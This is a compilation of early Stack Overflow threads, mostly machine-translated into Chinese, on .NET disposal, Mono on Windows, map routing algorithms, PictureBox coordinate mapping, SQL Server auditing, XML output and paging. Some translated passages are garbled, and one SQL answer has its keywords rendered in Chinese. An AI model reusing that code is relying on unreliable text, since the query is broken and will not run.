Internally, `PropB` uses the private variable of `_B` and defaults to null. When `PropB.Get()` is used, it checks to see if `_PropB` is null and if it is, opens the resources needed to instantiate a `B` into `_PropB`. It then returns `_PropB`.

To my experience, this is a really useful trick.

Where the need to null comes in is if you reset or change A in some way that the contents of `_PropB` were the child of the previous values of `A`, you will need to Dispose AND null out `_PropB` so LazyLoad can reset to fetch the right value IF the code requires it.

If you only do `_PropB.Dispose()` and shortly after expect the null check for LazyLoad to succeed, it won't be null, and you'll be looking at stale data. In effect, you must null it after `Dispose()` just to be sure.

I sure wish it were otherwise, but I've got code right now exhibiting this behavior after a `Dispose()` on a `_PropB` and outside of the calling function that did the Dispose (and thus almost out of scope), the private prop still isn't null, and the stale data is still there.

Eventually, the disposed property will null out, but that's been non-deterministic from my perspective.

The core reason, as dbkk alludes is that the parent container (`ObjA` with `PropB`) is keeping the instance of `_PropB` in scope, despite the `Dispose()`.

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-08-05T20:46:08.033

There are some cases where it makes sense to null references. For instance, when you're writing a collection--like a priority queue--and by your contract, you shouldn't be keeping those objects alive for the client after the client has removed them from the queue.

But this sort of thing only matters in long lived collections. If the queue's not going to survive the end of the function it was created in, then it matters a whole lot less.

On a whole, you really shouldn't bother. Let the compiler and GC do their jobs so you can do yours.

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-08-17T04:46:54.057

Take a look at this article as well: [http://www.codeproject.com/KB/cs/idisposable.aspx](http://www.codeproject.com/KB/cs/idisposable.aspx)

For the most part, setting an object to null has no effect. The only time you should be sure to do so is if you are working with a "large object", which is one larger than 84K in size (such as bitmaps).

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2019-03-27T00:50:13.657

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2016-05-10T13:07:53.603

I believe by design of the GC implementors, you can't **speed up** GC with nullification. I'm sure they'd prefer you not worry yourself with how/when GC runs -- treat it like this ubiquitous **Being** protecting and watching over and out for you...(bows head down, raises fist to the sky)...

Personally, I often explicitly set variables to null when I'm done with them as a form of self documentation. I don't declare, use, then set to null later -- I null immediately after they're no longer needed. I'm saying, explicitly, "I'm officially done with you...be gone..."

Is nullifying necessary in a GC'd language? No. Is it helpful for the GC? Maybe yes, maybe no, don't know for certain, by design I really can't control it, and regardless of today's answer with this version or that, future GC implementations could change the answer beyond my control. Plus if/when nulling is optimized out it's little more than a fancy *comment* if you will.

I figure if it makes my intent clearer to the next poor fool who follows in my footsteps, and if it *"might"* potentially help GC sometimes, then it's worth it to me. Mostly it makes me feel tidy and clear, and Mongo likes to feel tidy and clear. :)

I look at it like this: Programming languages exist to let people give other people an idea of intent and a compiler a job request of what to do -- the compiler converts that request into a different language (sometimes several) for a CPU -- the CPU(s) could give a hoot what language you used, your tab settings, comments, stylistic emphases, variable names, etc. -- a CPU's all about the bit stream that tells it what registers and opcodes and memory locations to twiddle. Many things written in code don't convert into what's consumed by the CPU in the sequence we specified. Our C, C++, C#, Lisp, Babel, assembler or whatever is theory rather than reality, written as a statement of work. What you see is not what you get, yes, even in assembler language.

I do understand the mindset of "unnecessary things" (like blank lines) "are nothing but noise and clutter up code." That was me earlier in my career; I totally get that. At this juncture I lean toward that which makes code clearer. It's not like I'm adding even 50 lines of "noise" to my programs -- it's a few lines here or there.

There are exceptions to any rule. In scenarios with volatile memory, static memory, race conditions, singletons, usage of "stale" data and all that kind of rot, that's different: you NEED to manage your own memory, locking and nullifying as apropos because the memory is not part of the GC'd Universe -- hopefully everyone understands that. The rest of the time with GC'd languages it's a matter of style rather than necessity or a guaranteed performance boost.

At the end of the day make sure you understand what is eligible for GC and what's not; lock, dispose, and nullify appropriately; wax on, wax off; breathe in, breathe out; and for everything else I say: If it feels good, do it. Your mileage may vary...as it should...

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2019-09-13T09:52:55.537

I think setting something back to null is messy. Imagine a scenario where the item being set to now is exposed say via property. Now is somehow some piece of code accidentally uses this property after the item is disposed you will get a null reference exception which requires some investigation to figure out exactly what is going on.

I believe framework disposables will allows throw ObjectDisposedException which is more meaningful. Not setting these back to null would be better then for that reason.

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2008-08-05T20:21:17.317

Some object suppose the `.dispose()` method which forces the resource to be removed from memory.

# windows - 在 Windows 上进行 Mono 开发的最佳设置是什么？

> ID：2786
> 
> 赞同：35
> 
> 时间：2008-08-05T20:15:22.820
> 
> 标签：windows, mono

我开始尝试使用 Mono，目前主要是为了好玩。我首先尝试使用将 csproj 转换为 makefile 的 Visual Studio 插件，但似乎没有适用于 Visual Studio 2005 的版本。我还阅读了 MonoDevelop IDE，这听起来不错。不幸的是，它没有预制的 Windows 包。我尝试按照一些说明通过组合来自其他半相关安装的依赖项来构建它。它没有用，但这可能是因为我是一个面向 Windows 的人，几乎不会拼写“makefile”。

所以，我的问题是：在 Windows 上尝试一些基于 Mono 的开发的最低能耗方式是什么？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-08-05T22:43:57.013

我建议获取 VMWare Player 并使用网站上提供的免费 Mono 开发平台映像。

[下载单声道](http://www.go-mono.com/mono-downloads/download.html)

设置时间将非常短，并且它还允许您让您的代码在 .NET 中运行，然后专注于移植问题，而无需大量的切换机器之类的麻烦。VMWare Player 工具将允许您简单地将文件拖放到上面来复制它们。

我正在寻找一些我的 .NET 应用程序并使它们与 Mono 兼容，这就是我很快将要采取的路径。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-12-08T16:48:16.117

一年后，这个问题的答案发生了很大变化。您现在可以在 Windows 上使用[MonoDevelop](http://monodevelop.com/Download)，或者如果您更熟悉 Visual Studio，您可以使用[Visual Studio 工具](http://go-mono.com/monotools)编写所有内容，然后在 VM 中进行调试以确保它在 Linux 上运行。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2008-08-05T21:23:45.490

@Chris 我发现 Visual Studio 是针对 .NET 开发的最佳 IDE——我认为针对 Mono 的最佳方式实际上只是在 Windows 下的 Visual Studio 中开发和构建，然后直接在 Linux 上运行这些二进制文件（或其他任何东西）您正在使用的其他 Mono 平台）。如果许可是一个问题，则有免费版本的 Visual Studio。如果您在 Linux 下开发，最好的软件可能是带有 Mono 插件的 Eclipse（有关安装说明，请参阅[The Mono Handbook - Eclipse](http://www.gotmono.com/docs/ide/eclipse.html "Mono 手册 - Eclipse")），但请记住，它没有 Visual Studio 所具备的功能或语言集成量。

@modesty Mono 是 .NET 框架的第 3 方开源实现，它允许您在 Windows 以外的平台上运行 .NET 应用程序。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2008-08-08T14:29:04.727

如果使用 Visual Studio for Mono 开发，您可以做的最好的事情之一就是获得 MoMA [http://www.mono-project.com/MoMA](http://www.mono-project.com/MoMA)。这将检查您构建的任意数量的程序集并生成显示潜在 Mono 问题的报告（例如，未在 mono 库中实现的方法）。它可以从 GUI 或命令行运行以用于自动构建。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-09-08T13:28:56.417

Miguel 有一篇关于调试在 linux 上运行的 Mono 以及在 Visual Studio 上进行远程调试的帖子。这可能是您想要研究的内容... [使用 Visual Studio 调试 Mono](http://tirania.org/blog/archive/2008/Sep-04.html)。还有一个名为[CloverLeaf](http://groups.google.com/group/mono-soc-2008/web/installing-cloverleaf?hl=en)的新项目，其目标是在 Visual Studio 中启用 Windows 上的 Mono 调试。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-09-15T17:37:24.450

没有理由使用 Mono*构建您的应用程序。*.Net CLR 的全部意义在于编译后的输出是跨平台的。

因此，您可以简单地使用您最喜欢的 IDE 构建它（如果您喜欢 IDE，Microsoft 是最好的），然后在 Mono 上进行*测试。*即使你让 Mono 在 Windows 上运行，它也不是对你的应用程序可移植性的一个很好的测试：如果你的应用程序做了一些愚蠢的事情，比如假设文件名中有反斜杠，或者一个名为 Program Files 的文件夹有什么特别之处？进行可移植性测试的最佳方法是在目标平台上实际测试您的应用程序。

[使用 Linux VMware 播放器（如http://www.go-mono.com/mono-downloads/download.html](http://www.go-mono.com/mono-downloads/download.html)中的播放器）很容易做到这一点。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2009-07-31T12:55:16.267

就个人而言，我只是在 Visual Studio 2008 中编译，就好像它是为 .Net 2.0 编译的，然后在 Mono 中运行（在 VirtualBox 中的 Windows 上的 VS2008，在 OSX 上的 Mono）。无论如何，所有问题都是在运行时出现的，因此系统运行良好。

我刚刚发现了这个[非常新的链接](http://chriscyvas.com/2009/02/16/getting-mono-and-visual-studio-to-play-nice-together/)，它非常棒，它向您展示了如何为 Mono 设置 Visual Studio 2008。

同时，[在 VirtualBox（Sun 的产品）内的 OpenSuse 或 Ubuntu 上设置 Mono](http://www.go-mono.com/mono-downloads/download.html)非常简单、轻松，并且不会强迫您放弃通常使用的任何平台。

这与您的问题无关，但我可能会注意到我刚刚进入 Mono 并且我对实现了多少 .Net 感到惊讶，包括许多 Winforms 的东西。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-08-05T21:27:58.183

我的第一直觉是相当无用的“安装 Linux”。你有点[逆流](http://tirania.org/blog/archive/2006/Jan-11.html)而上，试图在 windows 下进行单声道开发。根据我的经验，安装 GTK 和一切都有点麻烦。

如果您确实喜欢使用 linux，那么您可以[尝试 Ubuntu](http://www.ubuntu.com/getubuntu/download)

除此以外：

这里有一些信息：[http://www.mono-project.com/Mono:Windows](http://www.mono-project.com/Mono:Windows)似乎[cygwin](http://www.cygwin.com)工具链可能是你最好的选择。遗憾的是，我认为您将无法避免使用 makefile。[我从O'Reilly](http://www.ondotnet.com/pub/a/dotnet/2005/02/07/monowindows.html)找到了一个更明确的教程。

@谦虚：

> Mono 提供了在 Linux、Solaris、Mac OS X、Windows 和 Unix 上开发和运行 .NET 客户端和服务器应用程序所需的软件。Mono 开源项目由 Novell ( [http://www.novell.com ) 赞助，拥有一个活跃而热情的贡献社区，并定位为 Linux 应用程序开发的首选。](http://www.novell.com)

-- 来自 Mono 网站。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-08-28T10:19:00.317

Mono 的 Eclipse 插件已死。在 Linux 上，如果您喜欢良好的商业支持，请使用[MonoDevelop](http://www.monodevelop.com/Main_Page)或[X-Develop](http://www.omnicore.com/en/xdevelop.htm)（尽管 MonoDevelop 正在快速关闭它们）。在 Windows 上， [SharpDevelop](http://sharpdevelop.net/OpenSource/SD/)具有自定义 MSBuild 目标，用于针对 Mono 编译代码。

由于 Mono 和 MonoDevelop 变化很快，请务必使用最新发布的版本，即使它们尚未标记为稳定（例如，库存 Ubuntu 附带的版本非常过时）。

VMWare 映像是开始在 Linux 上测试 Windows 开发代码的好方法。不要碰 cygwin，除非你已经非常熟悉它了。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-08-05T22:37:07.107

我喜欢尝试使用 MonoDevelop 的想法，主要是为了确保我的东西可以在 Mono 运行时运行。我想也有可能对 msbuild 感到疯狂并编写一些自定义目标来尝试针对 Mono 进行构建，但这基本上是在模拟现在已经失效的插件的功能，我认为构建这些功能并非易事。我确实对 cygwin 有一点经验，我很高兴整天输入“配置”和“制作”，但是当这个过程中出现问题时，我几乎被搞砸了。我可能会再次尝试使用这一切，但如果我需要几个多小时才能想出一种方法来轻松地构建 Mono 运行时，我可能会放弃。

我将尝试 Eclipse 的想法。我将它用于 Java，所以我可以让 c# 的东西工作。我们会看到...

# google-maps - 地图路由，类似于谷歌地图？

> ID：2798
> 
> 赞同：24
> 
> 时间：2008-08-05T20:24:42.960
> 
> 标签：google-maps, google-maps-api-3, mapping, gis

我一直对 Map Routing 很感兴趣，但我从来没有找到任何好的入门（甚至是高级！）级别的教程。有没有人有任何指针，提示等？

**更新：**我主要是在寻找有关如何实现地图系统（数据结构、算法等）的指针。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-08-05T20:27:36.633

看看[开放街道地图项目](http://www.openstreetmap.org/)，看看在一个真正自由的软件项目中是如何处理这类事情的，只使用用户提供和许可的数据，并有一个[包含您可能会感兴趣的东西的 wiki](http://wiki.openstreetmap.org/index.php/Main_Page)。

几年前，参与其中的人很随和，回答了我的很多问题，所以我看不出他们为什么仍然不是一个好人。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-08-15T04:31:27.390

通过地图路由，您的意思是找到沿街道网络的最短路径？

Dijkstra 最短路径算法是最著名的。维基百科的介绍不错：[http ://en.wikipedia.org/wiki/Dijkstra%27s_algorithm](http://en.wikipedia.org/wiki/Dijkstra%27s_algorithm)

这里有一个 Java 小程序，您可以在其中看到它的运行情况：[http](http://www.dgp.toronto.edu/people/JamesStewart/270/9798s/Laffra/DijkstraApplet.html) ://www.dgp.toronto.edu/people/JamesStewart/270/9798s/Laffra/DijkstraApplet.html和谷歌您可以引导您找到几乎任何的源代码语言。

任何生成行车路线的实际实施都将包括街道网络上的大量数据，这些数据描述了与穿越链接和节点相关的成本——道路网络层次结构、平均速度、交叉路口优先级、交通信号连接、禁止转弯等。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-09-24T23:19:48.583

A* 实际上更接近于生产映射算法。与 Dijikstra 的原始算法相比，它需要的探索要少得多。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-09-17T08:44:28.847

谷歌地图寻路功能的工程师之一巴里·布鲁米特（Barry Brumitt）就该主题写了一篇可能感兴趣的帖子：

[更好的寻路之路](http://googleblog.blogspot.com/2007/11/road-to-better-path-finding.html) 11/06/2007 03:47:00 PM

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-08-06T13:35:08.930

而不是向每个地图服务提供商学习 API（如 Gmaps、Ymaps api） 学习[Mapstraction很好](http://www.mapstraction.com/doc/)

“Mapstraction 是一个为各种 javascript 映射 API 提供通用 API 的库”

我建议您访问 URL 并学习通用 API。也有大量的 How-Tos。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-09-17T08:34:24.207

我还没有找到关于路由的好教程，但是有很多代码要阅读：

有使用 Openstreetmap 数据的 GPL 路由应用程序，例如在 Windows（+移动）和 Linux 上工作的[Gosmore 。](http://wiki.openstreetmap.org/index.php/Gosmore)有许多有趣的 [应用程序使用相同的数据，但 gosmore 有一些很酷的用途[，例如与网站的接口](http://tile.openstreetmap.nl/~lambertus/routing-world/index.php)。

路由的最大问题是糟糕的数据，你永远得不到足够好的数据。因此，如果您想尝试它，请保持您的测试非常本地化，以便您可以更好地控制数据。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-09-26T14:05:18.623

从概念的角度来看，想象一下将一块石头扔进池塘并观察涟漪。这些路线将代表池塘和您的起始位置的石头。

当然，随着距离 n 的增加，算法必须搜索 n^2 路径的一部分。您将带您开始位置并检查从该点开始的所有可用路径。然后递归调用这些路径末端的点，依此类推。

您可以提高性能，方法是不要在路径上双重支持，如果某个点已被覆盖，则不重新检查路径，并放弃花费太长时间的路径。

另一种方法是使用蚂蚁信息素方法，蚂蚁从起点随机爬行并留下气味踪迹，这样越多蚂蚁越过给定路径。如果您从起点和终点都发送（足够）蚂蚁，那么最终气味最强的路径将是最短的。这是因为在给定时间段内，最短路径将被访问更多次，因为蚂蚁以均匀的速度行走。

**编辑@Spikie**

作为对如何实现池塘算法的进一步解释 - 突出显示了所需的潜在数据结构：

您需要将地图存储为网络。这只是它们之间的一组`nodes`和`edges`。一组`nodes`构成一个`route`。一条边连接两个节点（可能都是同一个节点），并有一个关联的`cost`如`distance`或`time`来遍历边。边可以是双向的，也可以是单向的。可能最简单的方法是只有单向的，然后在节点之间进行双向旅行（即一条边从 A 到 B，另一条边从 B 到 A）。

举例来说，想象三个火车站以向上的等边三角形排列。在它们之间还有另外三个车站。边将所有相邻的站点连接在一起，最终的图表将有一个倒三角形位于较大的三角形内。

从左下角开始标记节点，从左到右并向上，分别为 A、B、C、D、E、F（F 在顶部）。

假设可以沿任一方向遍历边缘。每条边的成本为 1 公里。

好的，所以我们希望从左下角的 A 到顶部的 F 站。有许多可能的路线，包括那些自己加倍返回的路线，例如 ABCBDEF。

我们有一个例程`NextNode`，它接受 a`node`和 a`cost`并为它可以到达的每个节点调用自身。

显然，如果我们让这个例程运行，它最终会发现所有路线，包括可能无限长的路线（例如 ABABABAB 等）。我们通过检查`cost`. 每当我们访问一个以前没有访问过的节点时，我们都会将成本和我们来自的节点放在那个节点上。如果在我们检查现有成本之前已经访问了一个节点，并且如果我们更便宜，那么我们更新节点并继续（递归）。如果我们更昂贵，那么我们跳过节点。如果所有节点都被跳过，那么我们退出例程。

如果我们命中目标节点，那么我们也会退出例程。

这样，所有可行的路线都会被检查，但最重要的是只检查那些成本最低的路线。在该过程结束时，每个节点将具有最低的到达该节点的成本，包括我们的目标节点。

为了获得我们从目标节点向后工作的路线。由于我们存储了我们来自的节点以及成本，我们只是向后跳来构建路由。对于我们的示例，我们最终会得到如下内容：

节点 A -（总）成本 0 - 来自节点 无
节点 B - 成本 1 - 来自节点 A
节点 C - 成本 2 - 来自节点 B
节点 D - 成本 1 - 来自节点 A
节点 E - 成本 2 - 来自节点 D / 成本2 - 来自节点 B（这是一个例外，因为成本相同）
节点 F - 成本 2 - 来自节点 D

所以最短的路线是ADF。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2011-09-18T21:34:27.853

关于每次遍历的成本，我想到了另一个想法，但会增加计算所需的时间和处理能力。

**示例：**根据谷歌地图，我可以采取 3 种方式（我住的地方）从 A 点到 B 点。`Quickest`Garmin 设备在路线计算中提供这 3 条路径中的每一条。在多次遍历这些路线并取平均值后（显然会根据一天中的时间、咖啡因的量等而产生误差），我觉得算法可以考虑道路上的弯道数量以实现高精度,**例如** *1 英里 的 直线 路 将 比 1 英里 的 有 急弯 的 路 快*. 这不是一个实用的建议，但肯定是我用来改善日常通勤结果集的建议。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-07-15T21:13:02.097

根据我在该领域工作的经验，A* 做得非常好。它（如上所述）比 Dijkstra 的算法快，但对于普通的有能力的程序员来说仍然足够简单来实现和理解。

构建路线网络是最难的部分，但这可以分解为一系列简单的步骤：获得所有道路；对点进行排序；使不同道路上的相同点组成为交叉点（节点）；在节点连接的两个方向上添加弧线（或仅在单向道路的一个方向上）。

A* 算法本身[在 Wikipedia 上有很好的记录](http://en.wikipedia.org/wiki/A%2a)。优化的关键地方是从开放列表中选择最佳节点，为此您需要一个高性能的优先级队列。如果您使用 C++，您可以使用 STL priority_queue 适配器。

自定义算法以在网络的不同部分（例如，行人、汽车、公共交通工具等）上根据速度、距离或其他标准进行路由是非常容易的。您可以通过编写过滤器来控制哪些路段可用、何时构建网络以及为每个路段分配的权重。

# c# - 我应该如何从屏幕空间坐标转换为 WinForms PictureBox 中的图像空间坐标？

> ID：2804
> 
> 赞同：21
> 
> 时间：2008-08-05T20:28:30.143
> 
> 标签：c#, winforms, picturebox

`PictureBox`我有一个在 Windows 窗体控件中显示图像的应用程序。`SizeMode`控件的 设置为，以便`Zoom`包含在 中的图像`PictureBox`将以正确的方式显示，而不管`PictureBox`.

这对于应用程序的视觉外观非常有用，因为您可以根据需要调整窗口大小，并且图像将始终以最适合的方式显示。不幸的是，我还需要处理图片框上的鼠标单击事件，并且需要能够从屏幕空间坐标转换为图像空间坐标。

看起来很容易从屏幕空间转换到控制空间，但我没有看到任何明显的从控制空间转换到图像空间的方法（即在图片框中已缩放的源图像中的像素坐标）。

有没有一种简单的方法可以做到这一点，或者我应该复制他们在内部使用的缩放数学来定位图像并自己进行翻译？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-08-06T04:25:02.490

我最终只是手动实现了翻译。代码还不错，但确实让我希望他们直接为它提供支持。我可以看到这种方法在很多不同的情况下都很有用。

我想这就是他们添加扩展方法的原因:)

在伪代码中：

```
// Recompute the image scaling the zoom mode uses to fit the image on screen
imageScale ::= min(pictureBox.width / image.width, pictureBox.height / image.height)

scaledWidth  ::= image.width * imageScale
scaledHeight ::= image.height * imageScale

// Compute the offset of the image to center it in the picture box
imageX ::= (pictureBox.width - scaledWidth) / 2
imageY ::= (pictureBox.height - scaledHeight) / 2

// Test the coordinate in the picture box against the image bounds
if pos.x < imageX or imageX + scaledWidth < pos.x then return null
if pos.y < imageY or imageY + scaledHeight < pos.y then return null

// Compute the normalized (0..1) coordinates in image space
u ::= (pos.x - imageX) / imageScale
v ::= (pos.y - imageY) / imageScale
return (u, v) 
```

要获得图像中的像素位置，您只需乘以实际图像像素尺寸，但归一化坐标允许您解决原始响应者关于逐案解决歧义的观点。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-08-05T20:33:01.693

根据缩放比例，相对图像像素可以是多个像素中的任何位置。例如，如果图像被显着缩小，像素 2、10 可能代表 2、10 一直到 20、100），因此您必须自己进行数学运算并对任何不准确承担全部责任！:-)

# sql-server - SQL Server 2000：有没有办法判断一条记录的最后修改时间？

> ID：2809
> 
> 赞同：11
> 
> 时间：2008-08-05T20:33:21.757
> 
> 标签：sql-server

该表没有最后更新的字段，我需要知道现有数据何时更新。因此，添加最后更新的字段将无济于事（据我所知）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-08-05T20:58:17.477

SQL Server 2000 不会为您跟踪此信息。

根据您的数据库模型，可能有创造性/模糊的方式来猜测这个日期是什么。但是，如果您谈论的是与其他数据无关的 1 个表，那么您就不走运了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-08-05T21:32:01.013

如果没有某种审计机制，您将无法检查更改。您正在寻找提取尚未收集的信息。如果您只需要知道何时添加或编辑了记录，那么添加一个在记录更新时通过触发器更新的日期时间字段将是最简单的选择。

如果您还需要跟踪记录何时被删除，那么您将需要使用审计表，并在添加、编辑或删除记录时从触发器中填充一行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-02T05:43:32.263

您可以尝试使用日志查看器；这基本上只是让您查看事务日志中的事务，因此您应该能够找到更新相关行的语句。我不建议将此作为生产级审计策略，但我发现它在紧要关头很有用。

这是我用过的一个；它是免费的，并且（仅）适用于 SQL Server 2000。

[http://www.red-gate.com/products/SQL_Log_Rescue/index.htm](http://www.red-gate.com/products/SQL_Log_Rescue/index.htm)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-08-05T20:34:41.817

您可以将时间戳字段添加到该表并使用更新触发器更新该时间戳值。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-08-05T21:04:47.153

[OmniAudit](http://www.krell-software.com/omniaudit/index.asp)是一个商业软件包，它在整个数据库中实现审计。

一种免费的方法是为每个表编写一个触发器，该触发器在触发时将条目添加到审计表中。

# sql - SQL Server 2005 For XML Explicit - 需要帮助格式化

> ID：2811
> 
> 赞同：12
> 
> 时间：2008-08-05T20:35:56.150
> 
> 标签：sql, xml, sql-server-2005, formatting, for-xml

我有一个结构如下的表：

* * *

| 位置 ID | 帐号 |
| --- | --- |
| 长指南-这里 | 12345 |
| 长指南-这里 | 54321 |

要传递到另一个存储过程，我需要 XML 看起来像这样：

```
<root> 
    <clientID>12345</clientID>
    <clientID>54321</clientID>
</root> 
```

到目前为止，我能做的最好的事情就是这样：

```
<root clientID="10705"/> 
```

我正在使用这个 SQL 语句：

```
SELECT
    1 as tag,
    null as parent,
    AccountNumber as 'root!1!clientID'
FROM
    Location.LocationMDAccount
WHERE
    locationid = 'long-guid-here'
FOR XML EXPLICIT 
```

到目前为止，我已经查看[了 MSDN 页面](http://msdn.microsoft.com/en-us/library/ms345137.aspx)上的文档，但还没有得到想要的结果。

* * *

@公斤，

你的实际上给了我这个输出：

```
<root>
  <Location.LocationMDAccount>
    <clientId>10705</clientId>
  </Location.LocationMDAccount>
</root> 
```

我现在要坚持使用`FOR XML EXPLICIT`Chris Leon 的建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-08-05T20:51:03.547

尝试

```
SELECT
    1 AS Tag,
    0 AS Parent,
    AccountNumber AS [Root!1!AccountNumber!element]
FROM
    Location.LocationMDAccount
WHERE
    LocationID = 'long-guid-here'
FOR XML EXPLICIT 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-08-05T20:53:13.230

试试这个，克里斯：

```
SELECT
    AccountNumber as [clientId]
FROM
    Location.Location root
WHERE
    LocationId = 'long-guid-here'
FOR
    XML AUTO, ELEMENTS 
```

非常抱歉！我把你要的东西弄混了。我更喜欢 XML AUTO 只是为了便于维护，但我相信任何一个都是有效的。我为疏忽道歉;-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-08-05T20:53:19.157

我得到了它：

```
select
1 as tag,
null as parent,
AccountNumber as 'root!1!clientID!element'
from
Location.LocationMDAccount
where
locationid = 'long-guid-here'
for xml explicit 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-08-17T06:45:16.703

使用 SQL Server 2005（或可能是 2008），我发现 XML PATH 比 XML Explicit 更容易维护 SQL（特别是当 SQL 更长时）。

在这种情况下：

```
SELECT AccountNumber as "clientID"
FROM Location.LocationMDAccount
WHERE locationid = 'long-guid-here'
FOR XML PATH (''), Root ('root'); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-10-31T11:28:56.920

```
选择 1 作为标签，
       null 作为父母，
       AccountNumber 作为 'clientID!1!!element'
FROM Location.LocationMAccount
WHERE locationid = 'long-guid-here'
对于 XML 显式，root('root')

```

# http - 如何 curl 或 wget 网页？

> ID：2815
> 
> 赞同：19
> 
> 时间：2008-08-05T20:38:59.293
> 
> 标签：http, curl

我想做一个每晚的 cron 作业来获取我的 stackoverflow 页面并将其与前一天的页面进行比较，这样我就可以看到我的问题、答案、排名等的更改摘要。

不幸的是，我无法获得正确的 cookie 集等来完成这项工作。有任何想法吗？

另外，当测试完成后，我的状态页面是否可以在不登录的情况下访问？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-08-05T20:43:52.017

您的状态页面现在无需登录即可使用（单击[注销](https://stackoverflow.com/users/logout?returnurl=%2fquestions%2f2815%2fhow-to-curl-or-wget-a-stackoverflow-page)并尝试）。当 beta-cookie 被禁用时，您和您的状态页面之间将没有任何东西。

对于 wget：

```
wget --no-cookies --header "Cookie: soba=(LookItUpYourself)" https://stackoverflow.com/users/30/myProfile.html 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-08-05T22:04:12.947

从[马克哈里森](https://stackoverflow.com/questions/2815/#2878)

> 这就是有效的...
> 
> curl -s --cookie soba=. [https://stackoverflow.com/users](https://stackoverflow.com/users)

对于 wget：

```
wget --no-cookies --header "Cookie: soba=(LookItUpYourself)" https://stackoverflow.com/users/30/myProfile.html 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-08-05T20:43:31.733

好主意 ：）

我想你用过 wget 的

```
--load-cookies (filename) 
```

可能会有所帮助，但使用类似 Mechanize（在 Perl 或 python 中）之类的东西来更充分地模仿浏览器以获得好的蜘蛛可能会更容易。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-08-05T20:46:22.930

我也不知道如何让 cookie 工作，但是当我注销时，我能够在浏览器中访问我的状态页面，所以我认为一旦 stackoverflow 公开，这将工作。

这是一个有趣的想法，但你不会也选择底层 html 代码的差异吗？您是否有避免最终导致 html 差异而不是实际内容的策略？

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-08-05T21:22:42.467

这就是有效的...

```
curl -s --cookie soba=. http://stackoverflow.com/users 
```

# sql - 分页 SQL Server 2005 结果

> ID：2840
> 
> 赞同：41
> 
> 时间：2008-08-05T20:57:00.787
> 
> 标签：sql, sql-server-2005, paging

如何在 SQL Server 2005 中对结果进行分页？

我在 SQL Server 2000 中尝试过，但没有可靠的方法来做到这一点。我现在想知道 SQL Server 2005 是否有任何内置方法？

我所说的分页是指，例如，如果我按用户名列出用户，我希望能够只返回前 10 条记录，然后是接下来的 10 条记录，依此类推。

任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2008-08-05T20:59:21.563

你可以使用`the Row_Number()`函数。其用法如下：

```
SELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName
FROM Users 
```

它将从中产生一个结果集，其中包含一个`RowID`可用于在其间进行分页的字段。

```
SELECT * 
FROM 
    ( SELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName
      FROM Users 
    ) As RowResults
WHERE RowID Between 5 AND 10 
```

ETC

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2008-08-14T17:15:31.997

如果您试图在一个语句中获取它（总数加上分页）。您可能需要探索 SQL Server 对 partition by 子句的支持（ANSI SQL 术语中的窗口函数）。在 Oracle 中，语法就像上面使用 row_number() 的示例一样，但我还添加了一个 partition by 子句来获取分页中返回的每一行包含的总行数（总行数为 1,262）：

```
SELECT rn, total_rows, x.OWNER, x.object_name, x.object_type
FROM (SELECT COUNT (*) OVER (PARTITION BY owner) AS TOTAL_ROWS,
         ROW_NUMBER () OVER (ORDER BY 1) AS rn, uo.*
         FROM all_objects uo
         WHERE owner = 'CSEIS') x
WHERE rn BETWEEN 6 AND 10 
```

请注意，我有 where owner = 'CSEIS' 并且我的分区在所有者上。所以结果是：

```
RN  TOTAL_ROWS  OWNER   OBJECT_NAME            OBJECT_TYPE
6   1262    CSEIS   CG$BDS_MODIFICATION_TYPES   TRIGGER
7   1262    CSEIS   CG$AUS_MODIFICATION_TYPES   TRIGGER
8   1262    CSEIS   CG$BDR_MODIFICATION_TYPES   TRIGGER
9   1262    CSEIS   CG$ADS_MODIFICATION_TYPES   TRIGGER
10  1262    CSEIS   CG$BIS_LANGUAGES            TRIGGER 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-04-15T17:56:08.677

